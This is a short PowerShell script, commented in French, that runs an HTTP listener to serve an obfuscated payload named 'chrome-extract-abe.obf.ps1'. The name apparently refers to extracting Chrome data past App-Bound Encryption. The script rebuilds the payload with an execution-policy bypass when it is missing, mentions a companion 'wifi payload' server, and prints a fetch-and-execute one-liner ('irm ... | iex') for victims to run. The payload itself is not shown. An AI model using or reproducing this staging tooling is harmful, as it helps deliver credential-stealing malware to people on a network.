# Sert chrome-extract-abe.obf.ps1 en HTTP local (même idée que serve-wifi-payload.ps1).
param(
    [int]$Port = 8766,
    [string]$File = "$PSScriptRoot\chrome-extract-abe.obf.ps1"
)

if (-not (Test-Path -LiteralPath $File)) {
    & pwsh -NoProfile -ExecutionPolicy Bypass -File "$PSScriptRoot\pack-chrome-abe-obf.ps1"
}

$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://+:$Port/")
try {
    $listener.Start()
} catch {
    Write-Host "Echec bind (essayer en admin pour http://+:$Port/) : $_"
    $listener.Prefixes.Clear()
    $listener.Prefixes.Add("http://127.0.0.1:$Port/")
    $listener.Start()
}

$body = [IO.File]::ReadAllBytes($File)
Write-Host "Chrome ABE obf : http://<IP-LAN>:$Port/chrome-extract-abe.obf.ps1"
Write-Host "Test : irm -UseBasicParsing 'http://127.0.0.1:$Port/chrome-extract-abe.obf.ps1' | iex"
Write-Host "Ctrl+C pour arreter."

while ($listener.IsListening) {
  $ctx = $listener.GetContext()
  $path = $ctx.Request.Url.AbsolutePath.TrimStart('/')
  if ($path -eq '' -or $path -match 'chrome.*obf') {
    $ctx.Response.ContentType = 'text/plain; charset=utf-8'
    $ctx.Response.OutputStream.Write($body, 0, $body.Length)
  } else {
    $ctx.Response.StatusCode = 404
  }
  $ctx.Response.Close()
}